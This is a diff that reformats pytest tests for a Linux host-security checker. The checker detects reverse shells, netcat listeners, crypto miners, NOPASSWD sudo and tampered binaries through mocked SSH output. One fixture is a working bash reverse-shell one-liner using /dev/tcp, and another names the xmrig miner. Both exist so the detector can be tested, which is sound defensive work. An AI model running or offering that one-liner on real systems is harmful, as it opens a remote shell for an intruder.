@@ -59,6 +59,7 @@ class TestParsePortsUtil:
     def test_parse_ports_with_invalid_port_raises_error(self):
         """Test that invalid port raises ArgumentTypeError"""
         from argparse import ArgumentTypeError
+
         with pytest.raises(ArgumentTypeError):
             parse_ports("invalid,22")
 
@@ -77,7 +78,10 @@ class TestRenderReportPorts:
 
     def test_text_report_omits_closed_ports(self):
         system = self._base_system()
-        ports = [PortStatus(port=22, open=True, reason="Connected"), PortStatus(port=80, open=False, reason="timeout")]
+        ports = [
+            PortStatus(port=22, open=True, reason="Connected"),
+            PortStatus(port=80, open=False, reason="timeout"),
+        ]
 
         report = render_report_text(system, [], ports)
 
@@ -147,7 +151,9 @@ class TestBuildParser:
     def test_parser_enable_rootkit_scan(self):
         """Test parser recognizes enable-rootkit-scan flag"""
         parser = build_parser()
-        args = parser.parse_args(["localhost", "root", "password", "--enable-rootkit-scan"])
+        args = parser.parse_args(
+            ["localhost", "root", "password", "--enable-rootkit-scan"]
+        )
         assert args.enable_rootkit_scan is True
 
     def test_parser_rootkit_scan_defaults_to_false(self):
@@ -159,7 +165,9 @@ class TestBuildParser:
     def test_parser_check_package_hygiene(self):
         """Test parser recognizes check-package-hygiene flag"""
         parser = build_parser()
-        args = parser.parse_args(["localhost", "root", "password", "--check-package-hygiene"])
+        args = parser.parse_args(
+            ["localhost", "root", "password", "--check-package-hygiene"]
+        )
         assert args.check_package_hygiene is True
 
     def test_parser_package_hygiene_defaults_to_false(self):
@@ -286,13 +294,15 @@ class TestGatherSystemInfo:
         """Test gathering system info with mocked SSH session"""
         # Create mock SSH session
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "ubuntu\n", ""),  # hostname
-            (0, "5.15.0-107\n", ""),  # kernel
-            (0, "Ubuntu 22.04.5 LTS\n", ""),  # os
-            (0, "up 30 days\n", ""),  # uptime
-            (0, "2\n", ""),  # users
-        ])
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "ubuntu\n", ""),  # hostname
+                (0, "5.15.0-107\n", ""),  # kernel
+                (0, "Ubuntu 22.04.5 LTS\n", ""),  # os
+                (0, "up 30 days\n", ""),  # uptime
+                (0, "2\n", ""),  # users
+            ]
+        )
 
         info = gather_system_info(mock_ssh)
         assert info.hostname == "ubuntu\n"
@@ -335,10 +345,12 @@ class TestGatherRkhunterScan:
         """Test successful rkhunter scan"""
         mock_ssh = Mock()
         scan_output = "Rootkit Hunter version 1.4.6\n[OK] No rootkits detected\n[OK] All checks passed"
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "found", ""),  # which rkhunter check
-            (0, scan_output, ""),  # actual scan
-        ])
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "found", ""),  # which rkhunter check
+                (0, scan_output, ""),  # actual scan
+            ]
+        )
 
         result = gather_rkhunter_scan(mock_ssh)
         assert result is not None
@@ -347,10 +359,12 @@ class TestGatherRkhunterScan:
     def test_rkhunter_scan_with_password(self):
         """Test rkhunter scan with sudo password"""
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "found", ""),  # which rkhunter check
-            (0, "[OK] No rootkits detected", ""),  # actual scan with sudo
-        ])
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "found", ""),  # which rkhunter check
+                (0, "[OK] No rootkits detected", ""),  # actual scan with sudo
+            ]
+        )
 
         result = gather_rkhunter_scan(mock_ssh, password="test_password")
         assert result is not None
@@ -359,10 +373,12 @@ class TestGatherRkhunterScan:
     def test_rkhunter_scan_failure_returns_error_message(self):
         """Test rkhunter scan failure handling"""
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "found", ""),  # which rkhunter check
-            (1, "", "rkhunter command failed"),  # scan fails
-        ])
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "found", ""),  # which rkhunter check
+                (1, "", "rkhunter command failed"),  # scan fails
+            ]
+        )
 
         result = gather_rkhunter_scan(mock_ssh)
         assert result == "rkhunter scan failed or produced no output"
@@ -374,22 +390,22 @@ class TestCheckStaleUserAccounts:
     def test_stale_user_check_returns_result(self):
         """Test that stale user account check returns a CheckResult"""
         from linux_health.checks import check_stale_user_accounts
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "", ""))
-        
+
         result = check_stale_user_accounts(mock_ssh)
         assert result is not None
-        assert hasattr(result, 'status')
+        assert hasattr(result, "status")
         assert result.status in ["pass", "warn", "fail"]
 
     def test_no_stale_users_returns_pass(self):
         """Test when no stale users found"""
         from linux_health.checks import check_stale_user_accounts
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "", ""))
-        
+
         result = check_stale_user_accounts(mock_ssh)
         assert result.status == "pass"
 
@@ -400,7 +416,7 @@ class TestCheckAbnormalNetworkProcesses:
     def test_normal_services_returns_pass(self):
         """Test that normal services return PASS"""
         from linux_health.checks import check_abnormal_network_processes
-        
+
         mock_ssh = Mock()
         # Simulate normal listening services (ssh, http, dns)
         output = """LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1234,fd=3))
@@ -408,19 +424,19 @@ LISTEN 0 128 0.0.0.0:80 0.0.0.0:* users:(("nginx",pid=5678,fd=5))
 LISTEN 0 128 0.0.0.0:443 0.0.0.0:* users:(("nginx",pid=5678,fd=6))
 LISTEN 0 128 127.0.0.1:53 0.0.0.0:* users:(("dnsmasq",pid=9999,fd=10))"""
         mock_ssh.run = MagicMock(return_value=(0, output, ""))
-        
+
         result = check_abnormal_network_processes(mock_ssh)
         assert result.status == "pass"
 
     def test_suspicious_netcat_detected(self):
         """Test detection of netcat listener"""
         from linux_health.checks import check_abnormal_network_processes
-        
+
         mock_ssh = Mock()
         output = """LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1234,fd=3))
 LISTEN 0 128 0.0.0.0:9999 0.0.0.0:* users:(("nc",pid=6789,fd=4))"""
         mock_ssh.run = MagicMock(return_value=(0, output, ""))
-        
+
         result = check_abnormal_network_processes(mock_ssh)
         assert result.status == "warn"
         assert "nc" in result.details.lower() or "netcat" in result.details.lower()
@@ -428,33 +444,36 @@ LISTEN 0 128 0.0.0.0:9999 0.0.0.0:* users:(("nc",pid=6789,fd=4))"""
     def test_suspicious_shell_detected(self):
         """Test detection of shell listening"""
         from linux_health.checks import check_abnormal_network_processes
-        
+
         mock_ssh = Mock()
         output = """LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1234,fd=3))
 LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:(("bash",pid=7890,fd=5))"""
         mock_ssh.run = MagicMock(return_value=(0, output, ""))
-        
+
         result = check_abnormal_network_processes(mock_ssh)
         assert result.status == "warn"
-        assert "bash" in result.details.lower() or "reverse shell" in result.details.lower()
+        assert (
+            "bash" in result.details.lower()
+            or "reverse shell" in result.details.lower()
+        )
 
     def test_no_listeners_returns_pass(self):
         """Test when no listeners found"""
         from linux_health.checks import check_abnormal_network_processes
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "", ""))
-        
+
         result = check_abnormal_network_processes(mock_ssh)
         assert result.status == "pass"
 
     def test_command_failure_returns_pass(self):
         """Test graceful handling of command failure"""
         from linux_health.checks import check_abnormal_network_processes
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(1, "", "Command error"))
-        
+
         result = check_abnormal_network_processes(mock_ssh)
         assert result.status == "pass"
 
@@ -465,26 +484,34 @@ class TestGatherUnusedPackages:
     def test_unused_packages_apt_system(self):
         """Test package hygiene check on apt-based system"""
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "apt\n", ""),  # detect package manager
-            (0, "Remov python3-pip python3-dev\n", ""),  # autoremovable packages
-            (0, "build-essential\ngcc\n", ""),  # dev packages
-            (0, "", ""),  # bloat packages
-        ])
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "apt\n", ""),  # detect package manager
+                (0, "Remov python3-pip python3-dev\n", ""),  # autoremovable packages
+                (0, "build-essential\ngcc\n", ""),  # dev packages
+                (0, "", ""),  # bloat packages
+            ]
+        )
 
         result = gather_unused_packages(mock_ssh)
         assert result is not None
-        assert "apt" not in result or "orphan" in result.lower() or "build" in result.lower()
+        assert (
+            "apt" not in result
+            or "orphan" in result.lower()
+            or "build" in result.lower()
+        )
 
     def test_unused_packages_no_packages(self):
         """Test when no unused packages found"""
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "apt\n", ""),  # detect package manager
-            (0, "", ""),  # no autoremovable
-            (0, "", ""),  # no dev packages
-            (0, "", ""),  # no bloat
-        ])
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "apt\n", ""),  # detect package manager
+                (0, "", ""),  # no autoremovable
+                (0, "", ""),  # no dev packages
+                (0, "", ""),  # no bloat
+            ]
+        )
 
         result = gather_unused_packages(mock_ssh)
         assert result == "No obvious unused packages detected"
@@ -492,10 +519,12 @@ class TestGatherUnusedPackages:
     def test_unused_packages_yum_system(self):
         """Test package hygiene check on yum-based system"""
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "yum\n", ""),  # detect package manager
-            (0, "package-cleanup output\n", ""),  # cleanup output
-        ])
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "yum\n", ""),  # detect package manager
+                (0, "package-cleanup output\n", ""),  # cleanup output
+            ]
+        )
 
         result = gather_unused_packages(mock_ssh)
         assert result is not None
@@ -511,12 +540,14 @@ class TestGatherUnusedPackages:
     def test_unused_packages_with_password(self):
         """Test package hygiene with sudo password"""
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "apt\n", ""),  # detect package manager
-            (0, "Remov package1\n", ""),  # autoremovable with sudo
-            (0, "", ""),  # no dev packages
-            (0, "", ""),  # no bloat
-        ])
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "apt\n", ""),  # detect package manager
+                (0, "Remov package1\n", ""),  # autoremovable with sudo
+                (0, "", ""),  # no dev packages
+                (0, "", ""),  # no bloat
+            ]
+        )
 
         result = gather_unused_packages(mock_ssh, password="test_pass")
         assert result is not None
@@ -528,31 +559,31 @@ class TestCheckSuspiciousProcessLocations:
     def test_no_suspicious_processes_returns_pass(self):
         """Test when no processes in suspicious locations"""
         from linux_health.checks import check_suspicious_process_locations
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "", ""))
-        
+
         result = check_suspicious_process_locations(mock_ssh)
         assert result.status == "pass"
 
     def test_process_in_tmp_detected(self):
         """Test detection of process in /tmp"""
         from linux_health.checks import check_suspicious_process_locations
-        
+
         mock_ssh = Mock()
         output = "bash    1234 user    0r   REG  ... /tmp/malware"
         mock_ssh.run = MagicMock(return_value=(0, output, ""))
-        
+
         result = check_suspicious_process_locations(mock_ssh)
         assert result.status == "warn"
 
     def test_command_failure_returns_pass(self):
         """Test graceful failure handling"""
         from linux_health.checks import check_suspicious_process_locations
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(1, "", "Command not found"))
-        
+
         result = check_suspicious_process_locations(mock_ssh)
         assert result.status == "pass"
 
@@ -563,26 +594,30 @@ class TestCheckUnexpectedSudoUsage:
     def test_normal_sudoers_returns_pass(self):
         """Test with normal sudoers configuration"""
         from linux_health.checks import check_unexpected_sudo_usage
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "No sudoers.d files", ""),  # no special sudoers
-            (0, "", ""),  # no suspicious sudo commands
-        ])
-        
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "No sudoers.d files", ""),  # no special sudoers
+                (0, "", ""),  # no suspicious sudo commands
+            ]
+        )
+
         result = check_unexpected_sudo_usage(mock_ssh)
         assert result.status == "pass"
 
     def test_nopasswd_sudoers_detected(self):
         """Test detection of NOPASSWD sudoers"""
         from linux_health.checks import check_unexpected_sudo_usage
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "ALL=(ALL) NOPASSWD: ALL", ""),  # dangerous NOPASSWD
-            (0, "", ""),
-        ])
-        
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "ALL=(ALL) NOPASSWD: ALL", ""),  # dangerous NOPASSWD
+                (0, "", ""),
+            ]
+        )
+
         result = check_unexpected_sudo_usage(mock_ssh)
         assert result.status == "warn"
         assert "NOPASSWD" in result.details or "no password" in result.details.lower()
@@ -590,13 +625,15 @@ class TestCheckUnexpectedSudoUsage:
     def test_suspicious_sudo_commands_detected(self):
         """Test detection of suspicious sudo commands"""
         from linux_health.checks import check_unexpected_sudo_usage
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "", ""),
-            (0, "sudo COMMAND=/bin/bash", ""),  # bash via sudo
-        ])
-        
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "", ""),
+                (0, "sudo COMMAND=/bin/bash", ""),  # bash via sudo
+            ]
+        )
+
         result = check_unexpected_sudo_usage(mock_ssh)
         assert result.status == "warn"
 
@@ -607,10 +644,10 @@ class TestCheckRecentlyCreatedAccounts:
     def test_no_recent_accounts_returns_pass(self):
         """Test when no recent accounts exist"""
         from linux_health.checks import check_recently_created_accounts
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "", ""))
-        
+
         result = check_recently_created_accounts(mock_ssh)
         assert result.status == "pass"
 
@@ -618,15 +655,15 @@ class TestCheckRecentlyCreatedAccounts:
         """Test detection of recently created account"""
         from linux_health.checks import check_recently_created_accounts
         from datetime import datetime, timedelta
-        
+
         now = datetime.now()
         recent_date = now - timedelta(days=5)
         date_str = recent_date.strftime("%Y-%m-%d %H:%M:%S")
-        
+
         mock_ssh = Mock()
         output = f"{date_str}.123456+00:00|backdoor_user"
         mock_ssh.run = MagicMock(return_value=(0, output, ""))
-        
+
         result = check_recently_created_accounts(mock_ssh)
         assert result.status == "warn"
         assert "recently created" in result.item.lower()
@@ -635,15 +672,15 @@ class TestCheckRecentlyCreatedAccounts:
         """Test that old accounts return pass"""
         from linux_health.checks import check_recently_created_accounts
         from datetime import datetime, timedelta
-        
+
         now = datetime.now()
         old_date = now - timedelta(days=90)
         date_str = old_date.strftime("%Y-%m-%d %H:%M:%S")
-        
+
         mock_ssh = Mock()
         output = f"{date_str}.123456+00:00|olduser"
         mock_ssh.run = MagicMock(return_value=(0, output, ""))
-        
+
         result = check_recently_created_accounts(mock_ssh)
         assert result.status == "pass"
 
@@ -654,20 +691,20 @@ class TestCheckSystemBinaryModifications:
     def test_no_modified_binaries_returns_pass(self):
         """Test when no binaries modified"""
         from linux_health.checks import check_system_binary_modifications
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "", ""))
-        
+
         result = check_system_binary_modifications(mock_ssh)
         assert result.status == "pass"
 
     def test_modified_binary_detected(self):
         """Test detection of recently modified binary"""
         from linux_health.checks import check_system_binary_modifications
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "/bin/bash", ""))
-        
+
         result = check_system_binary_modifications(mock_ssh)
         assert result.status == "warn"
         assert "binary" in result.item.lower() or "modified" in result.item.lower()
@@ -675,11 +712,11 @@ class TestCheckSystemBinaryModifications:
     def test_multiple_modified_binaries_detected(self):
         """Test detection of multiple modified binaries"""
         from linux_health.checks import check_system_binary_modifications
-        
+
         mock_ssh = Mock()
         output = "/bin/bash\n/usr/bin/sudo\n/sbin/init"
         mock_ssh.run = MagicMock(return_value=(0, output, ""))
-        
+
         result = check_system_binary_modifications(mock_ssh)
         assert result.status == "warn"
         assert "3" in result.details
@@ -691,26 +728,30 @@ class TestCheckFailedLoginSpike:
     def test_normal_failed_logins_returns_pass(self):
         """Test with normal number of failed logins"""
         from linux_health.checks import check_failed_login_spike
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "5", ""),  # 5 failed logins
-            (0, "", ""),   # no IPs
-        ])
-        
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "5", ""),  # 5 failed logins
+                (0, "", ""),  # no IPs
+            ]
+        )
+
         result = check_failed_login_spike(mock_ssh)
         assert result.status == "pass"
 
     def test_high_failed_logins_returns_warn(self):
         """Test detection of high failed login count"""
         from linux_health.checks import check_failed_login_spike
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "50", ""),  # 50 failed logins
-            (0, "192.168.1.100\n192.168.1.101", ""),  # attacking IPs
-        ])
-        
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "50", ""),  # 50 failed logins
+                (0, "192.168.1.100\n192.168.1.101", ""),  # attacking IPs
+            ]
+        )
+
         result = check_failed_login_spike(mock_ssh)
         assert result.status == "warn"
         assert "50" in result.details or "spike" in result.item.lower()
@@ -718,10 +759,10 @@ class TestCheckFailedLoginSpike:
     def test_command_failure_returns_pass(self):
         """Test graceful handling of auth log unavailability"""
         from linux_health.checks import check_failed_login_spike
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(1, "", "Permission denied"))
-        
+
         result = check_failed_login_spike(mock_ssh)
         assert result.status == "pass"
 
@@ -731,21 +772,19 @@ class TestSuspiciousNetworkConnections:
 
     def test_no_external_connections_passes(self):
         """Test that no external connections passes"""
-        from linux_health.checks import check_suspicious_network_connections
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "0", ""))
-        
+
         result = check_suspicious_network_connections(mock_ssh)
         assert result.status == "pass"
 
     def test_many_external_connections_fails(self):
         """Test that many external connections fails"""
-        from linux_health.checks import check_suspicious_network_connections
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "60", ""))
-        
+
         result = check_suspicious_network_connections(mock_ssh)
         assert result.status == "fail"
         assert "60" in result.details
@@ -756,24 +795,21 @@ class TestHiddenFilesInSystemDirs:
 
     def test_no_hidden_files_passes(self):
         """Test that no hidden files passes"""
-        from linux_health.checks import check_hidden_files_in_system_dirs
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "0", ""))
-        
+
         result = check_hidden_files_in_system_dirs(mock_ssh)
         assert result.status == "pass"
 
     def test_many_hidden_files_fails(self):
         """Test that many hidden files fails"""
-        from linux_health.checks import check_hidden_files_in_system_dirs
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "10", ""),
-            (0, "/tmp/.backdoor\n/var/tmp/.malware", "")
-        ])
-        
+        mock_ssh.run = MagicMock(
+            side_effect=[(0, "10", ""), (0, "/tmp/.backdoor\n/var/tmp/.malware", "")]
+        )
+
         result = check_hidden_files_in_system_dirs(mock_ssh)
         assert result.status == "fail"
 
@@ -783,27 +819,19 @@ class TestKernelModuleIntegrity:
 
     def test_normal_modules_passes(self):
         """Test that normal module count passes"""
-        from linux_health.checks import check_kernel_module_integrity
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "50", ""),
-            (0, "", "")
-        ])
-        
+        mock_ssh.run = MagicMock(side_effect=[(0, "50", ""), (0, "", "")])
+
         result = check_kernel_module_integrity(mock_ssh)
         assert result.status == "pass"
 
     def test_suspicious_modules_fails(self):
         """Test that suspicious modules fail"""
-        from linux_health.checks import check_kernel_module_integrity
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "50", ""),
-            (0, "evil_module", "")
-        ])
-        
+        mock_ssh.run = MagicMock(side_effect=[(0, "50", ""), (0, "evil_module", "")])
+
         result = check_kernel_module_integrity(mock_ssh)
         assert result.status == "fail"
 
@@ -813,21 +841,21 @@ class TestActiveReverseShells:
 
     def test_no_reverse_shells_passes(self):
         """Test that no reverse shells detected passes"""
-        from linux_health.checks import check_active_reverse_shells
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "", ""))
-        
+
         result = check_active_reverse_shells(mock_ssh)
         assert result.status == "pass"
 
     def test_reverse_shell_detected_fails(self):
         """Test that detected reverse shell fails"""
-        from linux_health.checks import check_active_reverse_shells
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(return_value=(0, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", ""))
-        
+        mock_ssh.run = MagicMock(
+            return_value=(0, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "")
+        )
+
         result = check_active_reverse_shells(mock_ssh)
         assert result.status == "fail"
 
@@ -837,21 +865,19 @@ class TestWeakPasswordPolicy:
 
     def test_no_password_policy_fails(self):
         """Test that no password policy fails"""
-        from linux_health.checks import check_weak_password_policy
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "", ""))
-        
+
         result = check_weak_password_policy(mock_ssh)
         assert result.status == "fail"
 
     def test_password_policy_configured_passes(self):
         """Test that configured password policy passes"""
-        from linux_health.checks import check_weak_password_policy
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "minlen = 12\ndcredit = -1", ""))
-        
+
         result = check_weak_password_policy(mock_ssh)
         assert result.status == "pass"
 
@@ -861,30 +887,28 @@ class TestContainerEscapeIndicators:
 
     def test_not_in_container_passes(self):
         """Test that not being in container passes"""
-        from linux_health.checks import check_container_escape_indicators
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "none", ""),
-            (0, "0", ""),
-            (0, "restricted", ""),
-            (0, "0", "")
-        ])
-        
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "none", ""),
+                (0, "0", ""),
+                (0, "restricted", ""),
+                (0, "0", ""),
+            ]
+        )
+
         result = check_container_escape_indicators(mock_ssh)
         assert result.status == "pass"
 
     def test_privileged_container_fails(self):
         """Test that privileged container fails"""
-        from linux_health.checks import check_container_escape_indicators
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "docker", ""),
-            (0, "0", ""),
-            (0, "privileged", "")
-        ])
-        
+        mock_ssh.run = MagicMock(
+            side_effect=[(0, "docker", ""), (0, "0", ""), (0, "privileged", "")]
+        )
+
         result = check_container_escape_indicators(mock_ssh)
         assert result.status == "fail"
 
@@ -894,24 +918,19 @@ class TestARPSpoofing:
 
     def test_no_duplicates_passes(self):
         """Test that no duplicate MACs passes"""
-        from linux_health.checks import check_arp_spoofing
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "", ""),
-            (0, "10", "")
-        ])
-        
+        mock_ssh.run = MagicMock(side_effect=[(0, "", ""), (0, "10", "")])
+
         result = check_arp_spoofing(mock_ssh)
         assert result.status == "pass"
 
     def test_duplicate_macs_fails(self):
         """Test that duplicate MACs fail"""
-        from linux_health.checks import check_arp_spoofing
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "aa:bb:cc:dd:ee:ff", ""))
-        
+
         result = check_arp_spoofing(mock_ssh)
         assert result.status == "fail"
 
@@ -921,21 +940,19 @@ class TestDNSTampering:
 
     def test_normal_dns_passes(self):
         """Test that normal DNS configuration passes"""
-        from linux_health.checks import check_dns_tampering
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "8.8.8.8\n8.8.4.4", ""))
-        
+
         result = check_dns_tampering(mock_ssh)
         assert result.status == "pass"
 
     def test_suspicious_dns_fails(self):
         """Test that suspicious DNS fails"""
-        from linux_health.checks import check_dns_tampering
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "0.0.0.0", ""))
-        
+
         result = check_dns_tampering(mock_ssh)
         assert result.status == "fail"
 
@@ -945,25 +962,21 @@ class TestCryptoMiners:
 
     def test_no_miners_passes(self):
         """Test that no miners detected passes"""
-        from linux_health.checks import check_crypto_miners
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "", ""),
-            (0, "", ""),
-            (0, "25.5", "")
-        ])
-        
+        mock_ssh.run = MagicMock(
+            side_effect=[(0, "", ""), (0, "", ""), (0, "25.5", "")]
+        )
+
         result = check_crypto_miners(mock_ssh)
         assert result.status == "pass"
 
     def test_miner_process_fails(self):
         """Test that miner process detection fails"""
-        from linux_health.checks import check_crypto_miners
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "xmrig --donate-level 0", ""))
-        
+
         result = check_crypto_miners(mock_ssh)
         assert result.status == "fail"
 
@@ -973,27 +986,26 @@ class TestFileIntegrityCriticalBinaries:
 
     def test_unmodified_binaries_passes(self):
         """Test that unmodified binaries pass"""
-        from linux_health.checks import check_file_integrity_critical_binaries
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "", ""),
-            (0, "-rwxr-xr-x /bin/bash", "")
-        ])
-        
+        mock_ssh.run = MagicMock(
+            side_effect=[(0, "", ""), (0, "-rwxr-xr-x /bin/bash", "")]
+        )
+
         result = check_file_integrity_critical_binaries(mock_ssh)
         assert result.status == "pass"
 
     def test_recently_modified_binaries_fails(self):
         """Test that recently modified binaries fail"""
-        from linux_health.checks import check_file_integrity_critical_binaries
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "/bin/bash\n/usr/bin/sudo", ""),
-            (0, "-rwxr-xr-x /bin/bash", "")
-        ])
-        
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "/bin/bash\n/usr/bin/sudo", ""),
+                (0, "-rwxr-xr-x /bin/bash", ""),
+            ]
+        )
+
         result = check_file_integrity_critical_binaries(mock_ssh)
         assert result.status == "fail"
 
@@ -1003,24 +1015,19 @@ class TestLogTampering:
 
     def test_normal_logs_passes(self):
         """Test that normal log files pass"""
-        from linux_health.checks import check_log_tampering
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "500", ""),
-            (0, "1000", "")
-        ])
-        
+        mock_ssh.run = MagicMock(side_effect=[(0, "500", ""), (0, "1000", "")])
+
         result = check_log_tampering(mock_ssh)
         assert result.status == "pass"
 
     def test_empty_logs_fails(self):
         """Test that empty logs fail"""
-        from linux_health.checks import check_log_tampering
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "0", ""))
-        
+
         result = check_log_tampering(mock_ssh)
         assert result.status == "fail"
 
@@ -1030,31 +1037,33 @@ class TestPrivilegeEscalationVectors:
 
     def test_no_vectors_passes(self):
         """Test that no escalation vectors passes"""
-        from linux_health.checks import check_privilege_escalation_vectors
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "", ""),  # no NOPASSWD entries
-            (0, "", ""),  # no dangerous capabilities
-            (0, "protected", ""),  # /etc/passwd not writable
-            (0, "sudo version 1.9.10p1", "")  # safe sudo version
-        ])
-        
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "", ""),  # no NOPASSWD entries
+                (0, "", ""),  # no dangerous capabilities
+                (0, "protected", ""),  # /etc/passwd not writable
+                (0, "sudo version 1.9.10p1", ""),  # safe sudo version
+            ]
+        )
+
         result = check_privilege_escalation_vectors(mock_ssh)
         assert result.status == "pass"
 
     def test_nopasswd_sudo_warns(self):
         """Test that NOPASSWD sudo warns"""
-        from linux_health.checks import check_privilege_escalation_vectors
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(side_effect=[
-            (0, "user ALL=(ALL) NOPASSWD: ALL", ""),
-            (0, "", ""),
-            (0, "protected", ""),
-            (0, "Sudo version 1.9.10", "")
-        ])
-        
+        mock_ssh.run = MagicMock(
+            side_effect=[
+                (0, "user ALL=(ALL) NOPASSWD: ALL", ""),
+                (0, "", ""),
+                (0, "protected", ""),
+                (0, "Sudo version 1.9.10", ""),
+            ]
+        )
+
         result = check_privilege_escalation_vectors(mock_ssh)
         assert result.status in ["warn", "fail"]
 
@@ -1064,21 +1073,21 @@ class TestWorldWritableSystemFiles:
 
     def test_no_writable_files_passes(self):
         """Test that no world-writable files passes"""
-        from linux_health.checks import check_world_writable_system_files
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "", ""))
-        
+
         result = check_world_writable_system_files(mock_ssh)
         assert result.status == "pass"
 
     def test_writable_files_fails(self):
         """Test that world-writable files fail"""
-        from linux_health.checks import check_world_writable_system_files
-        
+
         mock_ssh = Mock()
-        mock_ssh.run = MagicMock(return_value=(0, "/usr/bin/bad_file\n/etc/writable_config", ""))
-        
+        mock_ssh.run = MagicMock(
+            return_value=(0, "/usr/bin/bad_file\n/etc/writable_config", "")
+        )
+
         result = check_world_writable_system_files(mock_ssh)
         assert result.status == "fail"
 
@@ -1088,21 +1097,19 @@ class TestDeletedFileHandles:
 
     def test_no_deleted_handles_passes(self):
         """Test that no deleted file handles passes"""
-        from linux_health.checks import check_deleted_file_handles
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "", ""))
-        
+
         result = check_deleted_file_handles(mock_ssh)
         assert result.status == "pass"
 
     def test_deleted_handles_warns(self):
         """Test that deleted file handles warn"""
-        from linux_health.checks import check_deleted_file_handles
-        
+
         mock_ssh = Mock()
         mock_ssh.run = MagicMock(return_value=(0, "suspicious 1234 /tmp/.deleted", ""))
-        
+
         result = check_deleted_file_handles(mock_ssh)
         assert result.status == "warn"
 
